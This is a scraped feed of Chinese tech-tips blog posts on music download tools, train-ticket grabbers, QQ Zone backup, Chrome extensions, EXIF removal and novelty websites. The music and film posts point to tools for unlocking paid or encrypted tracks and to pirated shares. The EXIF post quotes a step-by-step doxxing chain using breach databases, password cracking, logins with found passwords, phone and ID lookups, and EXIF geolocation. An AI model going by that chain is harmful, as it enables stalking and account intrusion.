    <url>%2F2019%2F12%2F16%2F%E5%91%A8%E6%9D%B0%E4%BC%A6%E6%96%B0%E6%AD%8C%E3%80%8A%E6%88%91%E6%98%AF%E5%A6%82%E6%AD%A4%E7%9B%B8%E4%BF%A1%E3%80%8B%E5%9C%A8%E7%BA%BF%E6%94%B6%E5%90%AC%EF%BC%8C%E5%8F%A6%E9%99%84%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[平常听歌，大多数人用的软件就是网易云音乐和QQ音乐这些大公司的产品，之前也写过那些你可能不知道的网易云音乐奇技淫巧 ，但歌手版权可能在不同的公司，比如周杰伦的音乐版权不在网易云音乐而在QQ，所以就要装2个APP，但是有些歌还要VIP才能下载，下面就分享几个好用的音乐网站/工具。 洛雪音乐这是一个基于 Electron + Vue 开发的音乐软件，可以聚合搜索酷狗、酷我、QQ、网易云音乐等平台音乐，提供试听以及无损音质的下载。支持window ，Mac系统，win7需要启用透明效果，不然界面会显示异常。 网易云音乐下载工具可下载VIP付费灰色等所有歌曲 酷狗音乐，QQ音乐无损及付费音乐下载器 或者使用在线版 在线收听及下载今天周杰伦的新歌《我是如此相信 (电影《天火》主题曲)》你听了吗？来这里免费听，也可以搜索你喜欢的歌手。 以上软件和网站，关注本公众号回复 音乐 获取。 其他在线版 http://music.y444.cn周杰伦 http://mctool.cn/music/index.php?__K=36a4030f38c6fb9da51e2d52445dc15a21572051982_13567&amp;page=audioPage&amp;type=migu&amp;name=%E5%91%A8%E6%9D%B0%E4%BC%A6解锁网易云灰色歌曲 https://github.com/nondanee/UnblockNeteaseMusic https://www.52pojie.cn/thread-1028317-1-1.html 网易云音乐 加密格式解锁的工具 源代码: https://github.com/ix64/unlock-musicOnline Demo: https://tool.ixarea.com/music/网易云VIP音乐、无损音乐解析下载站分享 http://music.y444.cn https://www.52pojie.cn/thread-1073074-1-1.html周杰伦的歌http://tool.liumingye.cn/music/?type=migu&amp;name=%E5%91%A8%E6%9D%B0%E4%BC%A6网易云 mac 客户端搬到网页上 预览地址： https://music.sl1673495.now.sh/#/discovery源码地址： https://github.com/sl1673495/vue-netease-music阿里云的服务器已经过期了，贫穷限制了我的续费，所以我部署到了 now.sh 上酷狗音乐∕QQ音乐无损及付费音乐下载器 https://www.52pojie.cn/thread-1072554-1-1.html https://www.lanzous.com/i7yvtta花了一个小时，搭在自己 vps 上了 http://music.viayc.com/洛雪音乐助手桌面版 https://github.com/lyswhut/lx-music-desktop https://hao.su/3063/ https://www.52pojie.cn/thread-1009529-1-1.html http://www.ypojie.com/8864.html下载地址 https://www.lanzous.com/b906260/ 密码:glqw解锁QQ/网易VIP加密音乐下载无损音乐 https://www.isharepc.com/21212.html链接: https://pan.baidu.com/s/17C0gRG2ZmCWggRwoD-_W0g 提取码: jsed可下载VIP付费灰色等所有歌曲 https://www.52pojie.cn/thread-1072129-1-1.html 下载地址：https://www.lanzous.com/i7ynokd]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 春节买火车票攻略和抢票工具分享]]></title>
    <url>%2F2019%2F12%2F16%2F2020-%E6%98%A5%E8%8A%82%E4%B9%B0%E7%81%AB%E8%BD%A6%E7%A5%A8%E6%94%BB%E7%95%A5%E5%92%8C%E6%8A%A2%E7%A5%A8%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB%2F</url>
    <content type="text"><![CDATA[又到了一年一度春节抢票的时刻了，是不感觉每年的票都那么难买，这里分享下抢票攻略和工具，希望能助你抢到票，安心回家过年。 抢票时间自2019年12月12日起，12306业务办理时间由6：00—23：00延长至6：00—23：30。 2020年1月10日春运首日，12月12日就可以开始购买春运首日的火车票。2020年1月22日、1月23日出行高峰期，抢票时间为2019年12月24日、25日。2020年1月29日、1月30日第一波节后返程高峰，返程抢票日期为2019年12月31日和2020年1月1日， 具体看图 http://news.cctv.com/2019/12/11/ARTIIE5kCYnrDLtKGvnNa0aF191211.shtml 以上来自人民日报微博 https://weibo.com/2803301701/Ik5fgEunl?refer_flag=1001030103_ 。 另外今年全国各地逐渐开始推广电子客票，乘车时不需要再换取纸质车票，直接刷身份证或动态三维码即可进站乘车 https://weibo.com/1784473157/IktrtiEhF?refer_flag=1001030103_例如北京到上海的G135就可以用电子客票。抢票之前可以试试买全程票，虽然多花点钱，能买到票也值得，还有12306的候补功能也可以用用，这样有退票会按候补顺序兑现车票。 下面分享几个实用的抢票工具。 bypasshttps://www.bypass.cn/ bypass应该很多人用过，bypass分流抢票软件是一款非常专业的抢票软件，支持自动抢票、自动识别验证码、稳定捡漏等多种功能，把抢票时间设定好，它会自动抢票直到抢票成功，然后通过微信通知你，你只需要30分钟内在12306付款即可。 看软件更新日志https://www.bypass.cn/changelog.html ，作者今天还在更新。使用很简单，就不多说了。 木鱼抢票助手一款问世8年的软件，应该很多人也用过https://www.fishlee.net/soft/12306/ ， 最后更新时间是2019.12.9 超级抢票机超级抢票机，一款超强的火车票抢票神器 http://www.super12306.com功能也不少 Python 脚本抢票12306 购票助手，支持集群，多账号，多任务购票以及 Web 页面管理 https://github.com/pjialin/py1230612306智能刷票，订票 https://github.com/testerSunshine/12306如果你会代码可以使用这2个来抢，就是使用难度有点大。 你用过哪些靠谱的抢票软件，也可以留言分享下。 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019年11月最新使用油猴加速百度网盘下载方法 用 Markdown 写简历和 PPT 那些有趣的网站 比谷歌更有意思的知识提取搜索引擎 magi 有了内网穿透神器 ngrok ，个人电脑也能做服务器 公众号：苏生不惑 其他2020年春节按时回家【原12306分流抢票 https://www.52pojie.cn/thread-1072443-1-1.htmlbypass 用了四年，很好用 https://cn.v2ex.com/t/628248#reply26超级抢票机，一款超强的火车票抢票神器 ，直接贴出下载地址下载地址 http://www.super12306.com/ https://www.52pojie.cn/thread-1071898-1-1.html]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[张国荣电影全集网盘分享]]></title>
    <url>%2F2019%2F12%2F16%2F%E5%BC%A0%E5%9B%BD%E8%8D%A3%E7%94%B5%E5%BD%B1%E5%85%A8%E9%9B%86%E7%BD%91%E7%9B%98%E5%88%86%E4%BA%AB%2F</url>
    <content type="text"><![CDATA[说起哥哥，有太多的记忆，关于他为何自杀至今仍是个谜。 张国荣（Leslie Cheung Kwok Wing，1956年9月12日－2003年4月1日），已故香港歌影坛巨星，精通粤语、国语、英语。[6]他在大中华地区乃至亚洲均拥有广泛的影响力[7]。此外，张国荣对艺术的涉猎很广，曾经担任电影配乐、排舞、音乐录影带导演和艺术总监，是演艺圈多栖发展以及商业与艺术事业最成功的代表之一。 他于1983年因为歌曲《风继续吹》而成名。自1986年起，接连两年在十大劲歌金曲颁奖典礼上获得金曲金奖。1980年代于韩国取得非常高的知名度，[8]成为第一位享誉韩国乐坛的华人歌手。[9]1987年靠着专辑《爱慕》打入韩国的唱片市场。1988年至1989年在十大劲歌金曲颁奖典礼和叱咤乐坛流行榜颁奖典礼上，连续两届获得最受欢迎男歌星和叱咤乐坛男歌手金奖。1995年出版的专辑《宠爱》在韩国的销量超过50万张，至今仍保持华语唱片在韩国的销量纪录。[10][11][12]在1999年获得香港乐坛最高荣誉大奖金针奖。2010年在美国CNN举办的“过去五十年闻名全球的五大指标音乐人”选拔中排名第三，被视为香港粤语流行音乐的“开国元勋”之一。[13] 而电影方面，其1991年借着出演《阿飞正传》而成为第十届香港电影金像奖影帝。1993年靠着电影《霸王别姬》扬名国际影坛，更获得法国戛纳影展最佳男主角的提名。1994年又因为《霸王别姬》而获得日本影评人协会最佳男主角奖、第四届中国电影表演艺术学会特别贡献奖，《霸王别姬》这部电影亦获得法国戛纳影展金棕榈大奖；奥斯卡金像奖最佳外语片提名以及金球奖最佳外语片奖；张国荣更成为首位主演电影而获得奥斯卡金像奖最佳外语片提名的香港演员。同年，他因为《东邪西毒》获得第1届香港电影评论学会大奖最佳男主角[14]。1998年，张国荣成为首位担任柏林国际电影节评审的亚洲男演员。[15]2004年，入选《大众电影》评出的“中国电影史上最有影响力的十大男明星”。2005年，香港电影金像奖协会评选了“中国电影百年百部最佳华语片”，张国荣主演的电影有八部入选，作品数量居华人演员之首，[16]他亦被选为“中国电影一百年最喜爱的男演员”[17]；同年，他被中国电影表演艺术学会选为“中国电影百年百位优秀演员”之一。2010年被美国CNN选为“史上最伟大的25位亚洲演员”之一。[18]2011年，金马奖评选影史百大经典华语电影，张国荣主演的电影有七部入选。[19]2009年，《辞海》收录了张国荣此一词条，这也是《辞海》收录当代明星的首例。此外，《意大利百科全书》、法文百科全书《环球百科全书》、世界最权威的百科全书之一《大英百科全书》皆已收录张国荣此一词条。[20] 以上来自维基百科的介绍，相信不用我过多赘述。 尽管他已离去多年，但他曾经的那些音乐和电影依然留在世人的记忆中，这里收集了张国荣1980-2002的所有电影，比较知名的如《霸王别姬》《倩女幽魂》《英雄本色》《阿飞正传》《胭脂扣》《东成西就》《97家有喜事》。 想获取所有电影关注公众号回复 张国荣 ，后续还会更新刘德华，周星驰，李连杰等巨星电影，欢迎关注。 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 那些我关注的 b 站 up 主 那些我常听的中文播客节目 2019年11月最新使用油猴加速百度网盘下载方法 比谷歌更有意思的知识提取搜索引擎 magi 有了内网穿透神器 ngrok ，个人电脑也能做服务器 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何备份你的 QQ 空间相册]]></title>
    <url>%2F2019%2F12%2F13%2F%E5%A6%82%E4%BD%95%E5%A4%87%E4%BB%BD%E4%BD%A0%E7%9A%84-QQ-%E7%A9%BA%E9%97%B4%E7%9B%B8%E5%86%8C%2F</url>
    <content type="text"><![CDATA[领红包方法见文末 周末无聊的时候打开了下久违的QQ空间，那么多年的记录都还在。曾经建的杰伦相册。 想到之前网易相册都关闭了，虽然腾讯家大业大，但万一呢，于是想着把QQ空间的图片都备份下来。于是有了今天的文章，下面说说我的备份经历。 谷歌搜索万事不决先谷歌（ 想上谷歌在公众号回复 谷歌），搜索最近几个月的，因为早期的搜索结果没用，可以看我之前的文章那些你可能不知道的搜索奇技淫巧 。第一条找到了QQ官方链接 https://kf.qq.com/mini_info/18858.html，提到有个软件QQ影像。 QQ影像QQ影像是腾讯公司最新推出的一款桌面图片处理软件。以其清爽的界面、简洁轻便的操作，为您提供处理图片一站式体验。打开本地图片，轻松浏览，无干扰看图体验。美白祛痘，调曝光，加文字，剪裁图片，修改大小，更多便捷功能。一键上传到QQ空间，分享最新照片，朋友互动更方便。 下载地址https://pc.qq.com/detail/15/detail_755.html 软件下载后登录QQ发现空间相册打不开，也难怪，看这个软件上次更新还是2013年。 继续搜索发现有个方法，就是在群空间http://qun.qzone.qq.com/ 里创建相册然后导入图片下载。 QQ群相册下载自己建个群，创建一个相册。将自己要下载空间的相册复制到这个新建的群相册。 可惜一直失败，也不知道去哪里给腾讯报个bug。 如果成功复制过去了就可以批量下载了。 之前使用过油猴Chrome 浏览器扩展神器油猴，于是想着那里应该有对应的脚本。 油猴脚本https://greasyfork.org/zh-CN/ 这里一搜索果然有批量下载，另外还有删除说说，自动点赞。选择https://greasyfork.org/zh-CN/scripts/383121 这个脚本。 批量获取QQ空间相册照片原始URL，使用前需要先进入到某个相册，页面加载完毕后会按钮旁边添加一个“下载当页”的按钮，点击即可获取本页所有照片的原始URL，然后粘贴到迅雷里即可进行批量下载 安装以后打开QQ相册，点击下载当页会复制当前相册所有的图片地址。 比如第一张图片地址 https://r.photo.store.qq.com/psu?/358134412/netP.KgubOcxioj5M07tfnUNh2o590Hlg48qRmIfC5I!/m/Yd1T6w6JkAAAYnb69Q7WjwAAnull&amp;bo=WAJFAQAAAAABADk!&amp;rf=photolist&amp;t=5 ，然后用idm或迅雷下载这些地址就好了。 这样是可以下载，不过一个个相册点击还要导入idm下载有点麻烦，于是接着在Chrome插件里找，果然找到一个好用的。 QQ空间导出助手QQ空间导出助手，用于备份日志、私密日志、说说、相册、留言板、QQ好友、视频为文件，供永久保存。Chrome扩展地址 https://chrome.google.com/webstore/detail/qq%E7%A9%BA%E9%97%B4%E5%AF%BC%E5%87%BA%E5%8A%A9%E6%89%8B/aofadimegphfgllgjblddapiaojbglhf 登录QQ空间后点击扩展按钮可以看到可以导出说说，日志，相册，视频，留言板，好友等等，还能导出他人QQ空间内容（不包括私密日志和QQ好友），简直神器。 因为我几十个相册有点大，比较耗时，所以先导出留言板，一会就好了。 下载后的目录结构如下，.md文件使用markdown软件Typora 打开，关于markdown看看之前的文章用 Markdown 写简历和 PPT 下载的留言备份文件内容接着导出相册，花了近2个小时，确实有点慢，不过还是把2000多张图片下载完了。 相册导出的图片为高清原图，不包含Exif信息的，如果想清除带exif的图片可以看之前的文章如何清除手机拍照的图片 exif 防止泄露你的隐私 如果存在图片下载失败，一般为Chrome不信任安全证书导致，建议访问链接信任后重新下载。 题外话：如果你会代码的话可以使用 https://github.com/dslwind/qzone-photo-downloader/blob/master/readme_CN.md 或者 https://github.com/wwwpf/QzoneExporter 这个脚本来下载。 以上就是我备份QQ空间相册的流程，工具有很多，关键看你怎么快速找到并学会使用它，学会方法这才是根本，希望对你有所帮助。 最后发福利红包，类似之前的无套路，公众号 苏生不惑 抽奖送现金红包，在本文章下面留言（内容和本文相符），点赞数前8，每人6.6元现金红包（加我微信发送，截止时间12月12号20点），公众号原文链接。 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019年11月最新使用油猴加速百度网盘下载方法 用 Markdown 写简历和 PPT 那些有趣的网站 比谷歌更有意思的知识提取搜索引擎 magi 有了内网穿透神器 ngrok ，个人电脑也能做服务器 公众号：苏生不惑 其他各大网站登陆方式， 包括爬虫 https://github.com/CriseLYJ/awesome-python-login-modelhttp://photo.qq.com/portal/PHP 批量抓取 QQ 空间相册链接https://www.v2ex.com/t/624707 https://gitee.com/youngxj0/codes/zm8vs7c30niaqotyfwul460QQ空间照片下载器https://github.com/dslwind/qzone-photo-downloader/blob/master/readme_CN.mdhttps://github.com/ShunCai/QZoneExport实用工具https://www.isharepc.com/category/tools/一键生成QQ个人历史报告https://github.com/shengqiangzhang/examples-of-web-crawlers/tree/master/9.%E4%B8%80%E9%94%AE%E7%94%9F%E6%88%90QQ%E4%B8%AA%E4%BA%BA%E5%8E%86%E5%8F%B2%E6%8A%A5%E5%91%8AQQ空间 链接: https://pan.baidu.com/s/1T2A9z_fSMBFA5896g6EZLA 密码: kkfx 亲测可用，扫描二维码要等一会奇易QQ空间相册批量下载器 链接:https://pan.baidu.com/s/1c20vCly 密码: k3xi https://www.52pojie.cn/thread-543070-1-1.html下载地址：https://www.lanzous.com/i6q291e 密码:2zbd 某宝买的QQ空间相册批量下载 https://www.52pojie.cn/thread-1036575-1-1.html 链接：https://pan.baidu.com/s/12LFHHPAaLE-IjxBcy8XhrQ 提取码：wsb7易图QQ https://www.52pojie.cn/thread-979113-1-1.htmlQQ空间爬虫（可导出并显示日志、相册、留言板、说说、照片、视频等数据开源项目：https://github.com/wwwpf/QzoneExporter https://www.52pojie.cn/thread-953545-1-1.html]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些实用的 chrome 扩展神器]]></title>
    <url>%2F2019%2F12%2F09%2F%E9%82%A3%E4%BA%9B%E5%AE%9E%E7%94%A8%E7%9A%84-chrome-%E6%89%A9%E5%B1%95%E7%A5%9E%E5%99%A8%2F</url>
    <content type="text"><![CDATA[之前已经写过不少Chrome扩展那些我常用的 Chrome 扩展，这里继续推荐那些实用Chrome扩展 ，所谓实用就是能解决实际问题。 下载Chrome扩展需要先上谷歌，公众号回复 谷歌 获取使用方法，当然你也可以使用 https://chrome-extension-downloader.com/ 这个网站来下载crx文件，然后手动安装，不过这个网站不稳定。 手动安装扩展关于手动安装Chrome扩展还有小伙伴不大会用简单来说就是打开谷歌的扩展管理页面 chrome://extensions/ ，然后将下载crx文件拖进去，如果提示该扩展程序未列在 Chrome 网上应用店中，并可能是在您不知情的情况下添加的或者程序包无效。 先把文件后缀.crx 改成 .rar，然后解压得到一个文件夹，再打开chrome://extensions/ ，点击右上角的开发者模式，就可以看到加载已解压的扩展程序，选择刚才解压好的文件夹，确认新增扩展程序就安装好了。 自己摸索几下就会了，上谷歌后安装扩展就不用这么折腾了。下面是推荐的5个Chrome扩展。 微博相册下载进入微博首页或个人主页，点击扩展图标，点击需要下载的相册，比如王菲的微博主页 https://www.weibo.com/u/1629810574选择头像相册，有6张图片，很快下载好了。 Chrome扩展地址 https://chrome.google.com/webstore/detail/octo%E5%BE%AE%E5%8D%9A%E7%9B%B8%E5%86%8C%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD/cdimdlckbkfelaogjhfbkjcfncbpngkn QQ空间导出助手QQ空间导出助手，用于备份日志、私密日志、说说、相册、留言板、QQ好友、视频为文件，供永久保存。 登录QQ空间后点击扩展按钮可以看到可以导出说说，日志，相册，视频，留言板，好友等等，还能导出他人QQ空间内容（不包括私密日志和QQ好友），简直神器。 因为我几十个相册有点大，比较耗时，所以先导出留言板 下载后的目录结构如下，.md文件使用markdown软件Typora 打开，看看之前的文章用 Markdown 写简历和 PPT 留言备份文件内容 相册导出的原图为高清原图，不包含Exif信息的，如果想清除图片exif看之前的文章如何清除手机拍照的图片 exif 防止泄露你的隐私如果存在图片下载失败，一般为Chrome不信任安全证书导致，建议访问链接信任后重新下载。 扩展地址 https://chrome.google.com/webstore/detail/qq%E7%A9%BA%E9%97%B4%E5%AF%BC%E5%87%BA%E5%8A%A9%E6%89%8B/aofadimegphfgllgjblddapiaojbglhf 在线编辑 Word、Excel、PPT有了这个扩展后不用安装office就能打开Word等文档，直接将文档拖进 Chrome 查看，并且可以进行简单的编辑，非常方便，当然你也可以用谷歌云盘 https://www.google.com/drive/ 在线编辑 Word、Excel、PPT 。 Chrome扩展地址 https://chrome.google.com/webstore/detail/office-editing-for-docs-s/gbkeegbaiigmenfmjfclcdgdpimamgkj/related?hl=en 截图 ocr这个扩展让你方便的复制图片/视频/PDF中的文字 https://ocr.space/copyfish 打开这篇文章那些我常听的中文播客节目，图片有中文的话先设置语言。效果如图 扩展地址 https://chrome.google.com/webstore/detail/copyfish-%F0%9F%90%9F-free-ocr-soft/eenjdnjldapjajjofmldgmkjaienebbj当然还有各种ocr软件比如天若 OCR、PandaOCR ，在公众号回复 ocr 获取软件。 朗读网页Read Aloud 是一款用来朗读网页的 Chrome 扩展，支持 40 多种语言，包括普通话、国语、粤语等，支持阅读 PDF，默认是女声。也可以自己选择想听的语言。除了朗读整个网页，还可以选中文字朗读。 Chrome扩展地址 https://chrome.google.com/webstore/detail/read-aloud-a-text-to-spee/hdhinadidafjejdhmfkjgnolgimiaplp除了网页版还有对应的软件比如这个，公众号回复 语音 获取软件。 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019年11月最新使用油猴加速百度网盘下载方法 用 Markdown 写简历和 PPT 那些有趣的网站 比谷歌更有意思的知识提取搜索引擎 magi 有了内网穿透神器 ngrok ，个人电脑也能做服务器 如何清除手机拍照的图片 exif 防止泄露你的隐私 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何清除手机拍照的图片 exif 防止泄露你的隐私]]></title>
    <url>%2F2019%2F12%2F09%2F%E5%A6%82%E4%BD%95%E6%B8%85%E9%99%A4%E6%89%8B%E6%9C%BA%E6%8B%8D%E7%85%A7%E7%9A%84%E5%9B%BE%E7%89%87-exif-%E9%98%B2%E6%AD%A2%E6%B3%84%E9%9C%B2%E4%BD%A0%E7%9A%84%E9%9A%90%E7%A7%81%2F</url>
    <content type="text"><![CDATA[这两天有个微博话题 #微信发原图可泄露位置信息# 网传用微信发送照片原图，会泄露位置信息。专家表示确实如此，不过需同时满足3个条件：①手机GPS定位已打开；②拍照设置保存了地理位置；③发送原图。 然后【腾讯微信团队】对此回应：无论用微信、邮件或是其他传输工具发原图，都会附带位置、时间、拍摄机型等Exif信息。但朋友圈发的照片都经过系统自动压缩，不带位置等信息。若担心，可关闭定位或P图再发https://weibo.com/1930378853/IiLlCpuJW?refer_flag=1001030103_ exif这里说的exif是什么呢？ 可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。 Exif可以附加于JPEG、TIFF、RIFF等文件之中，为其增加有关数码相机拍摄信息的内容和索引图或图像处理软件的版本信息。Windows 7操作系统具备对Exif的原生支持，通过鼠标右键点击图片打开菜单，点击属性并切换到详细信息标签下即可直接查看Exif信息。Exif信息是可以被任意编辑的，因此只有参考的功能。 以上来自维基百科 https://zh.wikipedia.org/wiki/EXIF 只有使用设备（如相机、手机、摄像头等）拍摄的照片才有 EXIF 数据（截图没有），可以获取到拍照方向、相机设备型号、拍摄时间、ISO 感光度、GPS 地理位置等数据 ，简单地说，exif=jpeg+拍摄参数。 比如我之前在公司用手机拍的这张图片。 exif属性在Windows上右键图片可以看到详细信息，包含相机型号，焦距，拍摄日期等。还有经纬度 当然也可以使用专业的magicexif 来看 http://www.magicexif.com/ 也可以使用一些在线工具查看exif，比如 https://yijiangaitu.com/exif 但不知道这些工具是否会将你的原图保存在他们服务器，是个隐患，不过有个方法可以简单测试下是否上传了原图：断开网络，如果仍能正常使用说明不是后端程序处理，原图没有上传。 所以还是推荐使用开源的，比如 https://github.com/FeeiCN/EXIF ，我用这个搭建了个在线查看exif工具http://122.51.155.172:5000/ ，上传图片后获取的信息如下：然后在谷歌地图输入经纬度 40.0419444444,116.279166667 可以定位到新浪的位置（我在公司拍的）。https://www.google.com/maps/place/40%C2%B002&#39;31.0%22N+116%C2%B016&#39;45.0%22E/@40.0421532,116.2787023,18.25z/data=!4m5!3m4!1s0x0:0x0!8m2!3d40.0419444!4d116.2791667谷歌地球更直观点https://earth.google.com/web/@40.0419444,116.2791667,49.21370311a,786.12898499d,35y,0h,45t,0r/data=CjwaOhIyCgAZCyAhb14FREAhdqgB3t0RXUAqHDQwwrAwMiczMS4wIk4gMTE2wrAxNic0NS4wIkUYAiABKAIoAg 微信发原图上面那个话题说微信发原图可泄露位置信息，我测试了下，微信发送图片的时候有默认是不带原图的，这样发出去的图片EXIF/GPS信息也会被抹去，如果要发原图需要选中按钮，这样发出去图片中的EXIF信息将会被保存。 发原图的照片通过在电脑上可以看到exif信息，所以默认直接发送图片不用担心泄露你的位置信息。 但如果你用的某些APP或网站，不确认他们是否会直接发送并显示原图，最好关闭手机拍照的定位功能，删除图片的exif信息再分享出去。 清除exifWindows上有个选项可以删除exif 但不知道为什么我这删除失败了，大家可以试试自己的电脑。所以我用了命令行工具exiftool https://sno.phy.queensu.ca/~phil/exiftool/ 用exiftool 再看上面那张图片的详情，非常详细 一行命令清除图片所有exif信息。12$ exiftool -all= sina.jpg 1 image files updated 还可以修改图片的作者。12exiftool -artist=susheng sina.jpg 1 image files updated 其他常用命令123456 exiftool -gps:all= sina.jpg #删除gps信息 exiftool -all= sina.jpg #删除所有信息 exiftool -all= --exif:all sina.jpg #删除EXIF以外的所有信息 exiftool -artist=标签名称 sina.jpg #写入艺术家标签exiftool -artist=标签名称 a.jpg b.jpg c.jpg #写多个文件 exiftool -artist=标签名称 /exiftoolTest #所有文件 exiftoolTest为文件夹 清除exif后的图片再看拍摄日期和地理位置信息已经没了。如果嫌命令行麻烦可以使用这个软件，公众号内回复 exif 获取。 除了小心手机照片的exif泄露你的隐私，网上晒图也有风险，之前在微博上看到一个妹子晒图被人找到具体位置， 我只截了几张图，有兴趣去微博看，微博地址https://weibo.com/1627825392/IdCbBpaWv 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019年11月最新使用油猴加速百度网盘下载方法 用 Markdown 写简历和 PPT 那些有趣的网站 比谷歌更有意思的知识提取搜索引擎 magi 有了内网穿透神器 ngrok ，个人电脑也能做服务器 公众号：苏生不惑 其他EXIF信息在线删除工具https://coding.tools/cn/exif-remover http://www.exiferaser.com/有没有技术可以判断一张图片是否被PS过https://www.zhihu.com/question/19720234隐藏在图片中的重要信息 https://feei.cn/exif/Python 来删除照片的 Exif 信息 https://www.dreamxu.com/protection-of-privacy-the-image-exif-information/如何保护自己的隐私，工具删除图片的Exif 信息https://zhuanlan.zhihu.com/p/60332142Convert PDF to Images with Pdftoppm https://jdhao.github.io/2019/11/14/convert_pdf_to_images_pdftoppm/http://www.nicetool.net/app/exif.htmlhttp://www.atoolbox.net/Tool.php?Id=721https://www.dute.org/exif使用Python获取照片Exif信息 https://www.biaodianfu.com/exif-python.html一键获取图片 exif 信息，图片在线获取 exif 信息https://yijiangaitu.com/exif照片EXIF元数据科普 https://www.sankengriji.com/article/58.html教你通过照片的EXIF信息来确定拍照的实际地理位置http://ons.me/460.htmlPHP如何读取照片的Exif信息https://www.qttc.net/278_php_read_exif_from_photo.html浅谈互联网那些防不胜防的人肉搜索技巧 https://mp.weixin.qq.com/s/fHUQUSjBXWY151h0l9RsXwip定位 www.ipplus360.com经纬度查询map.yanue.net通过法院执行信息，我猜出了王思聪身份证号码 https://mp.weixin.qq.com/s/ePY52C4HnJJ0-efUxXxRrA 注册了哪些网站https://www.reg007.com/如何防止自己被人肉搜索到 https://www.zhihu.com/question/48691691#answer-40338211 https://cn.v2ex.com/t/624217#reply83 我人肉了一个用果照威胁女孩的变态 https://paper.seebug.org/810/ https://cn.v2ex.com/t/535557成功地报复了一个骗子，网络诈骗的。这一定是我做过的最骚的操作。 https://www.zhihu.com/question/293315890/answer/523802607别惹程序员系列之《老婆沉迷赌博输了一套房，我顺藤摸瓜端了澳门赌场》有课代表做了总结：1、站长之家查 whois2、站长之家的Ping功能查询了一下有没有加CDN3、同IP网站查询的功能进行搜索4、通过QQ空间发现其他QQ信息5、利用QQ的忘记密码功能，查询了一下这两个QQ绑定的手机号6、利用贴吧的高级搜索功能查询到网名为y的QQ7、社工库里面尝试了一下能不能查询到这个QQ的老密8、查到的密码用MD5进行加密了，我们到MD5的解密网站去进行解密9、查询到的密码试着登录（很多人都喜欢把自己的ID/姓名/手机号放到自己的密码里面）10、谷歌搜索他的ID，找到有用的信息，例如生活 QQ、身份证号码11、QQ邮箱尝试能不能搜索出支付宝12、利用支付宝转账功能的姓名验证获取到了他的全名13、身份证号+姓名就可以查询出身份证上的照片14、用Telegram的社工库查询接口对他的生活进行查询15、通过他的生活QQ进行域名Whois反查16、通过MagicEXIF定位到了他的家庭地址收集完他的基本信息后，开始谈判、最后报警 https://mp.weixin.qq.com/s/gL0pCFnJsOhrkNsVUi6GWQ查看exif https://www.sojson.com/image/exif.htmlEXIF查询 https://exif.tuchong.com/图片exif查看器 https://www.toolnb.com/tools/getexif.html在线查看数码照片Exif信息 https://www.gaitubao.com/exif2年前微信派就发过文章关于发送原图，这些事你得知道自己用的修改图片EXIF信息软件https://www.52pojie.cn/thread-203604-1-1.htmlexiftool(-k -r -charset filename= -all= -overwrite_original).exeExifTagRemove https://www.lanzous.com/i3ja7ba https://www.lanzous.com/i3ja83i删除EXIF信息的软件 https://www.52pojie.cn/thread-919176-1-1.htmlhttps://mlog.club/user/616https://wemp.app/posts/e6ebf85a-25eb-41e4-81f2-49f84b1f22e3http://www.python88.com/topic/50750http://www.exiferaser.com/ver/1.1ip查询 https://github.com.ipaddress.com/]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣的网站]]></title>
    <url>%2F2019%2F12%2F05%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[之前分享过那些有意思的网站 ，这里继续分享一波，也许你用得上。 福利单词一边背单词一边看妹子的网站，用电脑打开，配合ctrl+w 关闭新窗口，不知不觉就背了百来个词了 https://easychen.gitee.io/foxdict/ 工资计算器简单、精准、免费的 五险一金及税后工资计算器 周边计算服务 https://hizdm.cn/bonus/北京为例，月薪5万，税后只有36832.24 元。你可以选择自己的城市 Logo 生成器这是一个简单的 Logo 生成器，可以让你快速制作 Pornhub、YouTube 风格的 Logo https://www.zerobbs.net/pornhub/ https://www.zerobbs.net/youtube/ https://github.com/kasuganosoras/logo-maker https://github.com/bestony/logoly比如生成一个 苏生不惑 ，用这个做公众号头像怎么样？ 你好污啊全网最污的人都在这里了 https://nihaowua.90so.net/ 在线扫雷扫雷经典游戏，应该很多人在Windows下玩过，现在可以在线玩了https://www.saolei.org.cn/ ，有兴趣还可以玩玩五子棋，坦克。 微博热搜历史这里可以查看微博的热搜历史，生成热点词云图。https://www.enlightent.cn/research/rank/weiboSearchRank选择历史11月1号的微博热搜话题第一是杨超越致歉。 中国历史时间轴http://www.lishiju.net/timeline.html 从公元前2070年到今天，让你清晰的了解中国上下5千年历史。 虚假截图助手这是一个可以“伪造”微博、知乎、豆瓣、简书等网站界面截图的网站，看看鲁迅的微博又说什么了。https://fakes.netlify.com/#/sina/simple之前还有人伪造王思聪的微博发支付宝红包，其他那个数字是自己的，也不知道薅了多少支付宝羊毛，厉害。总之，不要轻信截图。 关键词找 电影https://www.whatismymovie.com/ 